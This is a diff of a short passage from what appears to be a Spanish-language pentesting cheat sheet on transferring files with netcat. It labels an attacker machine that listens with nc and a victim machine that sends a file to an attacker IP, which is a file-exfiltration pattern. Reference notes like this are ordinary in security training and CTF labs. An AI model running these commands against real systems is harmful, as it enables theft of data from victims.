@@ -82,17 +82,17 @@
 
 #Servidor
 
-	nc 10.10.14.2 4242 < file.tgz
+	nc 10.10.14.2 4242 < file
 
 #Cliente
 
-	nc -lvnp 4242 > file.tgz
-
-	maquina atacante
-	nc -lvnp "Ports" > "archivo"
+	nc -lvnp 4242 > file
 ----------------------------------------------------------------------------------------------------------------------------------------------------------
-	maquina victima
-	nc "IP" "Ports" < "archivo"
+	# maquina atacante
+	nc -lvnp "Port" > "archivo"
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+	# maquina victima
+	nc "IP" "Port" < "archivo"
 
 ```
 ### ssh
